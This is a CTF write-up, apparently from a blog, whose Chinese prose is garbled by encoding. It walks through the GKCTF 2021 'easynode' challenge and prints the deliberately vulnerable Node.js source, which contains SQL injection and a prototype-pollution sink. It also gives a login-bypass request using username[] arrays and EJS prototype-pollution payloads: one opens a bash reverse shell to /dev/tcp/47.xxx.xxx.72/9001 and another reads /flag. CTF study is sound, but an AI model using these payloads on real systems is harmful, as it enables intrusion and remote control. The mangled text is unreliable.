<p>ËÄåË∑üË∏™<strong>bucket</strong>Êàë‰ª¨ÂèØ‰ª•ÂèëÁé∞‰ªñÂú®ËÆøÈóÆ**&#x2F;profile<strong>Ë∑ØÁî±Êó∂Â∞±‰ºöÂ≠òÂÖ•</strong>personalBucket<strong>ÔºåÈÇ£‰πüÂ∞±ÊòØËØ¥Êàë‰ª¨ÂêåÊó∂ÂèëÈÄÅ‰∏§‰∏™ËØ∑Ê±ÇËÆøÈóÆ</strong>&#x2F;profile<strong>Ë∑ØÁî±ÔºåÁ¨¨‰∫å‰∏™ËØ∑Ê±Ç‰∏≠ÁöÑ</strong>bucket<strong>‰ºöÂØπ</strong>personalBucket<strong>ÈÄ†ÊàêË¶ÜÁõñÔºåÂÆåÊàêË¶ÜÁõñÂêéÊàë‰ª¨Âú®ËÆ©ÂÖ∂Ë∑≥ËΩ¨Âà∞</strong>&#x2F;verify<strong>Ë∑ØÁî±ÔºåÂ∞±ÂèØ‰ª•ÂÆûÁé∞Êàë‰ª¨ÂØπ</strong>personalBucket**ÊéßÂà∂</p>
<p>ÁÑ∂ÂêéÊàë‰ª¨Âà©Áî®<strong>goto</strong>ÊñπÊ≥ïÔºåÂéªÂÆûÁé∞ÂèçÂºπshell ÊàñËÄÖ cat &#x2F;flag</p>
<p>ÂâçÈù¢ÁöÑÈÉΩÊå∫Â•ΩÁêÜËß£ÁöÑÔºåËøôÈáåÂ∞±‰∏çÂÅöÊºîÁ§∫Ôºå‰ΩÜÊàëÊúÄÂêé‰∏ÄÊ≠•Â∫îËØ•ÊòØ‰º†ËøõÂéª‰∫ÜÔºåËøûÊé•Ê≤°ÊúâÊàêÂäüÔºå‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πà‰∫ÜÔºåÂÖàÊîæÁùÄÔºå‰ª•ÂêéÂÜçËØ¥</p>
<p><img src="/../image/596.png" class="lazyload" data-srcset="/../image/596.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="596"></p>
<h2 id="GKCTF-2021-easynode"><a href="#GKCTF-2021-easynode" class="headerlink" title="[GKCTF 2021]easynode"></a>[GKCTF 2021]easynode</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const format = require(&#x27;string-format&#x27;);</span><br><span class="line">const &#123; select,close &#125; = require(&#x27;./tools&#x27;);</span><br><span class="line">const app = new express();</span><br><span class="line">var extend = require(&quot;js-extend&quot;).extend</span><br><span class="line">const ejs = require(&#x27;ejs&#x27;);</span><br><span class="line">const &#123;generateToken,verifyToken&#125;  = require(&#x27;./encrypt&#x27;);</span><br><span class="line">var cookieParser = require(&#x27;cookie-parser&#x27;);</span><br><span class="line">app.use(express.urlencoded(&#123; extended: true &#125;));</span><br><span class="line">app.use(express.static((__dirname+&#x27;/public/&#x27;)));</span><br><span class="line">app.use(cookieParser());</span><br><span class="line"></span><br><span class="line">const decode = (str) =&gt;&#123;</span><br><span class="line">    str = str.replace(/\&#x27;/g,&#x27;\\\&#x27;&#x27;);</span><br><span class="line">    return str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let safeQuery =  async (username,password)=&gt;&#123;</span><br><span class="line"></span><br><span class="line">    const waf = (str)=&gt;&#123;</span><br><span class="line">        blacklist = [&#x27;\\&#x27;,&#x27;\^&#x27;,&#x27;)&#x27;,&#x27;(&#x27;,&#x27;\&quot;&#x27;,&#x27;\&#x27;&#x27;]</span><br><span class="line">        blacklist.forEach(element =&gt; &#123;</span><br><span class="line">            if (str == element)&#123;</span><br><span class="line">                str = &quot;*&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        return str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const safeStr = (str)=&gt;&#123; for(let i = 0;i &lt; str.length;i++)&#123;</span><br><span class="line">        if (waf(str[i]) ==&quot;*&quot;)&#123;</span><br><span class="line">            </span><br><span class="line">            str =  str.slice(0, i) + &quot;*&quot; + str.slice(i + 1, str.length);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    return str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    username = safeStr(username);</span><br><span class="line">    password = safeStr(password);</span><br><span class="line">    let sql = format(&quot;select * from test where username = &#x27;&#123;&#125;&#x27; and password = &#x27;&#123;&#125;&#x27;&quot;,username.substr(0,20),password.substr(0,20));</span><br><span class="line">    result = JSON.parse(JSON.stringify(await select(sql)));</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, async(req,res)=&gt;&#123;</span><br><span class="line">    const html = await ejs.renderFile(__dirname + &quot;/public/index.html&quot;)</span><br><span class="line">    res.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/html&quot;&#125;);</span><br><span class="line">    res.end(html)</span><br><span class="line">&#125;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">app.post(&#x27;/login&#x27;,function(req,res,next)&#123;</span><br><span class="line"></span><br><span class="line">    let username = req.body.username;</span><br><span class="line">    let password = req.body.password;</span><br><span class="line">    safeQuery(username,password).then(</span><br><span class="line">        result =&gt;&#123;</span><br><span class="line">            if(result[0])&#123;</span><br><span class="line">                const token = generateToken(username)</span><br><span class="line">                res.json(&#123;</span><br><span class="line">                    &quot;msg&quot;:&quot;yes&quot;,&quot;token&quot;:token</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                res.json(</span><br><span class="line">                    &#123;&quot;msg&quot;:&quot;username or password wrong&quot;&#125;</span><br><span class="line">                    );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ).then(close()).catch(err=&gt;&#123;res.json(&#123;&quot;msg&quot;:&quot;something wrong!&quot;&#125;);&#125;);</span><br><span class="line">  &#125;)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">app.get(&quot;/admin&quot;,async (req,res,next) =&gt; &#123;</span><br><span class="line">    const token = req.cookies.token</span><br><span class="line">    let result = verifyToken(token);</span><br><span class="line">    if (result !=&#x27;err&#x27;)&#123;</span><br><span class="line">        username = result</span><br><span class="line">        var sql = `select board from board where username = &quot;$&#123;username&#125;&quot;`;</span><br><span class="line">        </span><br><span class="line">        var query = JSON.parse(JSON.stringify(await select(sql).then(close())));  </span><br><span class="line">        </span><br><span class="line">        board = JSON.parse(query[0].board);</span><br><span class="line">        const html = await ejs.renderFile(__dirname + &quot;/public/admin.ejs&quot;,&#123;board,username&#125;)</span><br><span class="line">        res.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/html&quot;&#125;);</span><br><span class="line">        res.end(html)</span><br><span class="line">    &#125; </span><br><span class="line">    else&#123;</span><br><span class="line">        res.json(&#123;&#x27;msg&#x27;:&#x27;stop!!!&#x27;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">  </span><br><span class="line">app.post(&quot;/addAdmin&quot;,async (req,res,next) =&gt; &#123;</span><br><span class="line">    let username = req.body.username;</span><br><span class="line">    let password = req.body.password;</span><br><span class="line">    const token = req.cookies.token</span><br><span class="line">    let result = verifyToken(token);</span><br><span class="line">    if (result !=&#x27;err&#x27;)&#123;</span><br><span class="line">        gift = JSON.stringify(&#123; [username]:&#123;name:&quot;Blue-Eyes White Dragon&quot;,ATK:&quot;3000&quot;,DEF:&quot;2500&quot;,URL:&quot;https://ftp.bmp.ovh/imgs/2021/06/f66c705bd748e034.jpg&quot;&#125;&#125;);</span><br><span class="line">        var sql = format(&#x27;INSERT INTO test (username, password) VALUES (&quot;&#123;&#125;&quot;,&quot;&#123;&#125;&quot;) &#x27;,username,password);</span><br><span class="line">        select(sql).then(close()).catch( (err)=&gt;&#123;console.log(err)&#125;); </span><br><span class="line">        var sql = format(&#x27;INSERT INTO board (username, board) VALUES (\&#x27;&#123;&#125;\&#x27;,\&#x27;&#123;&#125;\&#x27;) &#x27;,username,gift);</span><br><span class="line">        select(sql).then(close()).catch( (err)=&gt;&#123;console.log(err)&#125;);</span><br><span class="line">        res.end(&#x27;add admin successful!&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        res.end(&#x27;stop!!!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.post(&quot;/adminDIV&quot;,async(req,res,next) =&gt;&#123;</span><br><span class="line">    const token = req.cookies.token</span><br><span class="line">    </span><br><span class="line">    var data =  JSON.parse(req.body.data)</span><br><span class="line">    </span><br><span class="line">    let result = verifyToken(token);</span><br><span class="line">    if(result !=&#x27;err&#x27;)&#123;</span><br><span class="line">        username = result;</span><br><span class="line">        var sql =`select board from board where username = &quot;$&#123;username&#125;&quot;`;</span><br><span class="line">        var query = JSON.parse(JSON.stringify(await select(sql).then(close().catch( (err)=&gt;&#123;console.log(err);&#125; )))); </span><br><span class="line">        </span><br><span class="line">        board = JSON.parse(JSON.stringify(query[0].board));</span><br><span class="line">        for(var key in data)&#123;</span><br><span class="line">            var addDIV =`&#123;&quot;$&#123;username&#125;&quot;:&#123;&quot;$&#123;key&#125;&quot;:&quot;$&#123;(data[key])&#125;&quot;&#125;&#125;`;</span><br><span class="line">            extend(&#123;&#125;,JSON.parse(addDIV));</span><br><span class="line">        &#125;</span><br><span class="line">        sql = `update board SET board = &#x27;$&#123;JSON.stringify(board)&#125;&#x27; where username = &#x27;$&#123;username&#125;&#x27;`</span><br><span class="line">        select(sql).then(close()).catch( ()=&gt;&#123;res.json(&#123;&quot;msg&quot;:&#x27;DIV ERROR?&#x27;&#125;);&#125;); </span><br><span class="line">        res.json(&#123;&quot;msg&quot;:&#x27;addDiv successful!!!&#x27;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        res.end(&#x27;nonono&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.listen(1337, () =&gt; &#123;</span><br><span class="line">    console.log(`App listening at port 1337`)</span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure>

<p>ËøôÈáåÁÆÄÂçïÂÆ°ËÆ°‰∏Ä‰∏ãÔºåÂèëÁé∞Â≠òÂú®ÊºèÊ¥ûÁÇπ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var addDIV = `&#123;&quot;$&#123;username&#125;&quot;:&#123;&quot;$&#123;key&#125;&quot;:&quot;$&#123;data[key]&#125;&quot;&#125;&#125;`;</span><br><span class="line">            </span><br><span class="line">            extend(board,JSON.parse(addDIV));</span><br></pre></td></tr></table></figure>

<p>ÁúãÂà∞Ëøô‰∏™ÂêàÁêÜÊÉ≥Âà∞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;__proto__&#x27;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/9001 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ÂÖ≥‰∫é‰∏∫‰ªÄ‰πàË∞ÉÁî®<strong>outputFunctionName</strong>ÔºåËøôÈáåË¥¥‰∏Ä‰∏™<a target="_blank" rel="noopener" href="https://blog.csdn.net/DARKNOTES/article/details/124000520">ÂçöÂÆ¢</a>ËøôÈáåÊúâÂÖ∑‰ΩìËÆ≤‰∫ÜË∞ÉÁî®<strong>outputFunctionName</strong>ÂéüÂõ†</p>
<p>ËøôÊ†∑Êàë‰ª¨Âè™ÈúÄË¶ÅÊéßÂà∂**${username}** **${key}<strong>Âíå</strong>${data[key]}**Ëøô‰∏â‰∏™ÂèòÈáèÔºåÂ∞±ÂèØ‰ª•ÂÆûÁé∞ÂéüÂûãÈìæÁöÑÊ±°ÊüìÔºåÁÑ∂ÂêéÊàë‰ª¨Êù•‰ªîÁªÜÁúãËøô‰∏â‰∏™ÂèòÈáèÁöÑÊéßÂà∂Ôºå</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var data =  JSON.parse(req.body.data)</span><br><span class="line">    </span><br><span class="line">    let result = verifyToken(token);</span><br><span class="line">    if(result !=&#x27;err&#x27;)&#123;</span><br><span class="line">        username = result;</span><br><span class="line">        var sql =`select board from board where username = &quot;$&#123;username&#125;&quot;`;</span><br><span class="line">        var query = JSON.parse(JSON.stringify(await select(sql).then(close().catch( (err)=&gt;&#123;console.log(err);&#125; )))); </span><br><span class="line">        </span><br><span class="line">        board = JSON.parse(JSON.stringify(query[0].board));</span><br><span class="line">        for(var key in data)&#123;</span><br><span class="line">            var addDIV =`&#123;&quot;$&#123;username&#125;&quot;:&#123;&quot;$&#123;key&#125;&quot;:&quot;$&#123;(data[key])&#125;&quot;&#125;&#125;`;</span><br><span class="line">            extend(&#123;&#125;,JSON.parse(addDIV));</span><br><span class="line">        &#125;</span><br><span class="line">        sql = `update board SET board = &#x27;$&#123;JSON.stringify(board)&#125;&#x27; where username = &#x27;$&#123;username&#125;&#x27;`</span><br><span class="line">        select(sql).then(close()).catch( ()=&gt;&#123;res.json(&#123;&quot;msg&quot;:&#x27;DIV ERROR?&#x27;&#125;);&#125;); </span><br><span class="line">        res.json(&#123;&quot;msg&quot;:&#x27;addDiv successful!!!&#x27;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        res.end(&#x27;nonono&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p> ‰πüÂ∞±ÊòØÈúÄË¶ÅÊûÑÈÄ†<strong>date</strong>Âíå<strong>username</strong>ÔºåËøôÈáåËøòÊúâ‰∏Ä‰∏™ÂØπtokenÁöÑÈ™åËØÅ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">const verifyToken = (data) =&gt; &#123;</span><br><span class="line">    let token = data;</span><br><span class="line">    let cert = fs.readFileSync(path.join(__dirname, &#x27;./pem/key.key&#x27;));//ÂÖ¨Èí• ÂèØ‰ª•Ëá™Â∑±ÁîüÊàê</span><br><span class="line">    let res;</span><br><span class="line">    try &#123;</span><br><span class="line">        let result = jwt.verify(token, cert) </span><br><span class="line">        // let result = jwt.verify(token, cert) || &#123;&#125;;</span><br><span class="line">        _id = result.data;</span><br><span class="line">        _date = result.exp;</span><br><span class="line">        _creatDate = result.iat;</span><br><span class="line">        let &#123;exp = 0&#125; = result, current = Math.floor(Date.now() / 1000);</span><br><span class="line">        if (current &lt;= exp) &#123;</span><br><span class="line">            res = result.data || &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        res = &#x27;err&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ÂÖ∂ÂÆû‰ªîÁªÜÁúãËØ≠Âè•ÂèØ‰ª•ÂèëÁé∞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql = `update board SET board = &#x27;$&#123;JSON.stringify(board)&#125;&#x27; where username = &#x27;$&#123;username&#125;&#x27;`</span><br></pre></td></tr></table></figure>

<p><strong>username</strong>Â∫îËØ•ÊòØÂΩì‰ΩúÁî®Êà∑Âêç‰º†ÂÖ•ÁöÑÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÂú®**&#x2F;addAdmin<strong>Ë∑ØÁî±‰∏ãÂàõÂª∫‰∏Ä‰∏™</strong><em>_proto</em>_**Ë∫´‰ªΩÁöÑË¥¶Âè∑ÔºåËÄå <strong>${key}<strong>Âíå</strong>${data[key]}<strong>Áõ¥Êé•‰ªé</strong>req.body.data</strong>‰º†ÂÖ•Âç≥ÂèØ</p>
<p>ÈÇ£‰πà<strong>token</strong>Âèà‰ªéÂì™ÈáåÊù•Âë¢</p>
<p>ÈÇ£‰πàÊàë‰ª¨ÁªßÁª≠Âêë‰∏äËøΩË∏™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(result[0])&#123;</span><br><span class="line">                const token = generateToken(username)</span><br><span class="line">                res.json(&#123;</span><br><span class="line">                    &quot;msg&quot;:&quot;yes&quot;,&quot;token&quot;:token</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>ËøôÈáåÂèØ‰ª•ËæìÂá∫<strong>token</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let username = req.body.username;</span><br><span class="line">let password = req.body.password;</span><br><span class="line">safeQuery(username,password).then(</span><br><span class="line">    result =&gt;&#123;</span><br></pre></td></tr></table></figure>

<p>‰ΩÜÊúÄÂâçÈù¢Â≠òÂú®‰∏ÄÂ±ÇÊ£ÄÊµãÔºåÊâÄ‰ª•Êï¥‰ΩìÊÄùË∑ØÂ∞±‰ª•ÂèäÂæàÊòéÊòæ‰∫ÜÔºåÁªïËøáÂØπ<strong>username</strong>Âíå<strong>password</strong>ÁöÑÊ£ÄÊµãÔºåËé∑ÂæóÊàë‰ª¨ÈúÄË¶ÅÁöÑtokenÔºåÂêåÊó∂ÊûÑÈÄ†<strong>username</strong>ÂÆåÊàêÊàë‰ª¨ÂØπÂéüÂûãÈìæÊ±°ÊüìÁöÑÊûÑÈÄ†</p>
<p>ËøôÊ†∑Êàë‰ª¨Â∞±ÂÖàÊù•ÁúãÊÄé‰πàÁªïËøáËøôÂ±ÇÊ£ÄÊµã</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">let safeQuery =  async (username,password)=&gt;&#123;</span><br><span class="line"></span><br><span class="line">    const waf = (str)=&gt;&#123;</span><br><span class="line">        blacklist = [&#x27;\\&#x27;,&#x27;\^&#x27;,&#x27;)&#x27;,&#x27;(&#x27;,&#x27;\&quot;&#x27;,&#x27;\&#x27;&#x27;]</span><br><span class="line">        blacklist.forEach(element =&gt; &#123;</span><br><span class="line">            if (str == element)&#123;</span><br><span class="line">                str = &quot;*&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        return str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const safeStr = (str)=&gt;&#123; for(let i = 0;i &lt; str.length;i++)&#123;</span><br><span class="line">        if (waf(str[i]) ==&quot;*&quot;)&#123;</span><br><span class="line">            </span><br><span class="line">            str =  str.slice(0, i) + &quot;*&quot; + str.slice(i + 1, str.length);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    return str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    username = safeStr(username);</span><br><span class="line">    password = safeStr(password);</span><br><span class="line">    let sql = format(&quot;select * from test where username = &#x27;&#123;&#125;&#x27; and password = &#x27;&#123;&#125;&#x27;&quot;,username.substr(0,20),password.substr(0,20));</span><br><span class="line">    result = JSON.parse(JSON.stringify(await select(sql)));</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ÂØπ‰∏Ä‰∫õÁâπÊÆäÂ≠óÁ¨¶ËøõË°åÊõøÊç¢ÔºåÂêåÊó∂Ê£ÄÊµã<strong>username</strong>Âíå<strong>password</strong>ÁöÑÈïøÂ∫¶ÔºåËøôÈáåÂØπÂ≠óÁ¨¶ÁöÑÊ£ÄÊµãÁöÑÂà§Êñ≠ËøêÁî®**&#x3D;&#x3D;<strong>Âº±ÊØîËæÉÔºå‰πüÂ∞±ÊòØÊàëÊàë‰ª¨ÂêåÊ†∑ÂèØ‰ª•Âà©Áî®</strong>username[]**Êï∞ÁªÑÁöÑÂΩ¢ÂºèËøõË°åÁªïËøáÔºå‰ΩÜÂçï‰ΩøÁî®Êï∞ÁªÑÁªïËøá‰∏çÊàêÂäü</p>
<p>Êàë‰ª¨Êù•ÁúãÂà∞<strong>substr</strong>ÂáΩÊï∞ÁöÑÂÆö‰πâ</p>
<blockquote>
<p>‰ªéÂ≠óÁ¨¶‰∏≤‰∏≠ËøîÂõû‰∏Ä‰∏™ÊåáÂÆöÁöÑÂ≠ê‰∏≤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSTRINGÔºàÂ≠óÁ¨¶‰∏≤ÔºåÂºÄÂßã‰ΩçÁΩÆÔºåÈïøÂ∫¶Ôºâ</span><br></pre></td></tr></table></figure>
</blockquote>
<p>‰πüÂ∞±ÊòØËØ¥Êàë‰ª¨ËøòÂæóÂà©Áî®Âà∞JavaScriptÁöÑÊÄßË¥®<code> str =  str.slice(0, i) + &quot;*&quot; + str.slice(i + 1, str.length)</code>ÔºåÈÄöËøáÊãºÊé•Â∞ÜÊï∞ÁªÑËΩ¨ÂåñÊàêÂ≠óÁ¨¶‰∏≤</p>
<p>ËøôÈáå‰∏ÄÂºÄÂßãÂæàÂ•ΩÂ•áËøôÊ†∑Â∞±ÂèØ‰ª•ÊûÑÈÄ†ÂÆåÊàê‰∫ÜÔºåËÄå‰∏î‰∏ç‰ºöË∂ÖÂá∫ÈôêÂà∂ÔºåÈÇ£‰πà<strong>substr</strong>ÂáΩÊï∞ÈôêÂà∂20‰∏™Â≠óÁ¨¶ÁöÑÊÑè‰πâÊòØ‰ªÄ‰πàÔºåÊìç‰ΩúÁöÑÊó∂ÂÄôÂèëÁé∞‰∏çÂØπÔºåÊ≤°ÊúâËææÂà∞‰∏ÄÂÆöÈïøÂ∞±Êó†Ê≥ïÊàêÂäüÁôªÂΩïÔºåËøôÈáåÂ∫îËØ•‰πüÊòØÂõ†‰∏∫<strong>substr</strong>ÂáΩÊï∞ÁöÑÂéüÂõ†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[]=admin&#x27;#&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=1&amp;username[]=(&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/../image/597.png" class="lazyload" data-srcset="/../image/597.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="597"></p>
<p>ÂæóÂà∞<strong>token</strong>ÂêéÂéª**&#x2F;addAdmin<strong>ÂàõÂª∫‰∏Ä‰∏™</strong><strong>proto</strong>**Ë¥¶Âè∑</p>
<p><img src="/../image/598.png" class="lazyload" data-srcset="/../image/598.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="598"></p>
<p>ÁÑ∂ÂêéÂÜç**&#x2F;adminDIV<strong>Ë∑ØÁî±‰∏ã‰º†ÂÖ•</strong>data**</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/9001 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>ËøôÈáåÂ∫îËØ•ÊòØ‰πüÂèØ‰ª•Áõ¥Êé•ËøõË°åÂëΩ‰ª§ÊâßË°åÁöÑ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag&#x27;);var __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>ÊàëËøôÈáåÁéØÂ¢ÉÁÉÇÁêÉ‰∫ÜÔºåÊáíÂæóÊé•ÁùÄÂÅöÊµãËØï‰∫ÜÔºåÂ∞±ËøôÊ†∑Âêß</p>

  </div>
  
  
    
    <div class='footer'>
